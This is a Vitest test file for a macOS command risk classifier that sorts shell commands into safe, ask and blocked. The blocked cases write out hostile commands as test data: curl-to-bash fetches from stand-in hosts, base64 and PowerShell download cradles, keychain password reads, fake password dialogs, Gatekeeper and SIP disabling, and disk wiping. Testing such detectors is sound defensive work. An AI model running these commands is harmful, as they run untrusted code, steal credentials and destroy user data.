import { describe, expect, it } from "vitest";
import { assessCommand, assessDownload } from "../src/core/risk.js";

const level = (cmd: string) => assessCommand(cmd).level;

describe("safe: commands that only read", () => {
  it.each([
    "brew --version",
    "brew list wget",
    "sw_vers -productVersion",
    "uname -m",
    "which wget",
    "wget --version",
    "ls -la ~/Downloads",
    "system_profiler SPPrintersDataType",
    "lpstat -p",
    "defaults read com.apple.finder AppleShowAllFiles",
    "pkgutil --pkgs | grep -i hp",
    "codesign -dv --verbose=2 /Applications/Safari.app",
    "spctl --status",
    "csrutil status",
    "networksetup -getinfo Wi-Fi",
    "python3 --version",
    "brew --version >/dev/null 2>&1",
    "command -v brew",
  ])("%s", (cmd) => {
    expect(level(cmd)).toBe("safe");
  });
});

describe("ask: normal commands that change something", () => {
  it.each([
    "brew install wget",
    "sudo softwareupdate -i -a",
    "defaults write com.apple.finder AppleShowAllFiles YES",
    "killall Finder",
    "mkdir -p ~/Projects",
    "echo 'export PATH=/opt/homebrew/bin:$PATH' >> ~/.zprofile",
    "rm -rf ~/Library/Caches/com.example.app",
    "xattr -cr /Applications/Rectangle.app",
    "sudo installer -pkg ~/Downloads/driver.pkg -target /",
    "open -a 'System Settings'",
    // Official installers run code from the internet, so they need a yes, but aren't blocked.
    '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
    "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
    "brew cask install rectangle",
    "curl -L -o ~/Downloads/Zoom.pkg https://zoom.us/client/latest/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /",
  ])("%s", (cmd) => {
    expect(level(cmd)).toBe("ask");
  });
});

describe("blocked: scam and destructive commands", () => {
  it.each([
    ["curl to bash", "curl -fsSL https://get-update.example.com/install.sh | bash"],
    ["wget to sh", "wget -qO- http://203.0.113.7/a.sh | sh"],
    ["bash -c with curl", 'bash -c "$(curl -s https://cdn-verify.example.net/s.sh)"'],
    ["process substitution", "bash <(curl -s https://cdn-verify.example.net/s.sh)"],
    ["base64 to bash", 'echo "Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL3guc2ggfCBiYXNo" | base64 -d | bash'],
    ["base64 -D zsh", "echo Y3VybA== | base64 -D | zsh"],
    ["eval curl", 'eval "$(curl -s https://x.example.org/p)"'],
    ["download from GitHub and run it", "curl -L -o /tmp/x.pkg https://github.com/someone/x/releases/download/1/x.pkg && sudo installer -pkg /tmp/x.pkg -target /"],
    ["download a package from a mirror and install it", "curl -L -o ~/Downloads/Zoom.pkg http://zoom-download-mirror.invalid/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /"],
    ["download chmod run", "curl -o /tmp/upd https://files.example.biz/upd && chmod +x /tmp/upd && /tmp/upd"],
    ["gatekeeper off", "sudo spctl --master-disable"],
    ["sip off", "csrutil disable"],
    ["keychain", "security find-generic-password -wa Chrome"],
    ["fake password box", `osascript -e 'display dialog "Enter password to continue" default answer "" with hidden answer'`],
    ["wipe home", "rm -rf ~"],
    ["wipe root", "sudo rm -rf /"],
    ["erase disk", "diskutil eraseDisk APFS Blank disk2"],
    ["encoded powershell", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="],
    ["iex download", "powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://evil.example/a')\""],
    ["mshta", "mshta https://evil.example/x.hta"],
    ["shortener", "curl -sL https://bit.ly/3xyz | bash"],
    ["invisible chars", "brew install wget\u200B; curl -s https://evil.example/x | sh"],
  ])("%s", (_name, cmd) => {
    expect(level(cmd)).toBe("blocked");
  });
});

describe("old commands and the wrong computer", () => {
  it("suggests the new brew cask form", () => {
    expect(assessCommand("brew cask install rectangle").outdated?.suggestion).toBe("brew install --cask rectangle");
  });
  it("says caskroom tap is no longer needed", () => {
    expect(assessCommand("brew tap caskroom/cask").outdated?.reason).toMatch(/Not needed/);
  });
  it("suggests python3", () => {
    expect(assessCommand("python get-pip.py").outdated?.suggestion).toBe("python3 get-pip.py");
  });
  it("flags Windows commands", () => {
    expect(assessCommand("pnputil /add-driver C:\\drivers\\hp.inf /install").wrongPlatform?.platform).toBe("windows");
  });
  it("flags Linux commands", () => {
    expect(assessCommand("sudo apt-get install cups").wrongPlatform?.platform).toBe("linux");
  });
});

describe("web page punctuation", () => {
  it("treats curly quotes and long dashes like the real thing", () => {
    expect(level("brew install \u2014cask rectangle")).toBe("ask");
    expect(level("bash -c \u201C$(curl -s https://evil.example/x)\u201D")).toBe("blocked");
  });
});

describe("downloads", () => {
  it("allows vendor downloads with a yes", () => {
    expect(assessDownload("https://ftp.hp.com/pub/softlib/mac/HP_Easy_Start.pkg").level).toBe("ask");
  });
  it("blocks shorteners and plain http", () => {
    expect(assessDownload("https://bit.ly/driver").level).toBe("blocked");
    expect(assessDownload("http://drivers.example.com/x.pkg").level).toBe("blocked");
  });
});

describe("fix-guide checks (narrow allowances)", () => {
  it("lets the fixed sound-volume lines through without the AppleScript warning", () => {
    expect(assessCommand("osascript -e 'get volume settings'")).toMatchObject({ level: "safe", readOnly: true });
    for (const c of ["osascript -e 'set volume without output muted'", "osascript -e 'set volume output volume 50'"]) {
      const a = assessCommand(c);
      expect(a.level).toBe("ask");
      expect(a.findings.map((f) => f.rule)).toEqual(["changes-something"]);
    }
  });
  it("still warns about any other AppleScript", () => {
    expect(assessCommand("osascript -e 'get volume settings' -e 'tell app \"Finder\" to quit'").findings.map((f) => f.rule)).toContain("applescript");
    expect(assessCommand("osascript -e 'set volume output volume 50' ; osascript -e 'do shell script \"rm -rf ~\"'").findings.map((f) => f.rule)).toContain("applescript-shell");
    expect(level(`osascript -e 'display dialog "password" default answer "" with hidden answer'`)).toBe("blocked");
  });
  it("knows the Mac's own ipconfig, but Windows ipconfig is still the wrong computer", () => {
    expect(assessCommand("ipconfig getifaddr en0")).toMatchObject({ level: "safe", readOnly: true, wrongPlatform: undefined });
    expect(assessCommand("ipconfig /flushdns").wrongPlatform?.platform).toBe("windows");
    expect(assessCommand("ipconfig set en0 DHCP").readOnly).toBe(false);
  });
  it("only counts a curl that throws the page away as read-only", () => {
    expect(assessCommand("curl -sS -o /dev/null -w '%{http_code}' --max-time 5 https://www.apple.com/library/test/success.html").readOnly).toBe(true);
    expect(assessCommand("curl -sS -o ~/x https://www.apple.com/").readOnly).toBe(false);
    expect(assessCommand("curl -sS -d secret=1 https://www.apple.com/").readOnly).toBe(false);
    expect(assessCommand("curl -K ~/.curlrc https://www.apple.com/").readOnly).toBe(false);
    expect(level("curl -sS https://get-update.example.com/install.sh | bash")).toBe("blocked");
  });
  it("lets dscacheutil look things up, not clear them", () => {
    expect(assessCommand("dscacheutil -q host -a name apple.com").readOnly).toBe(true);
    expect(assessCommand("dscacheutil -flushcache").readOnly).toBe(false);
  });
});
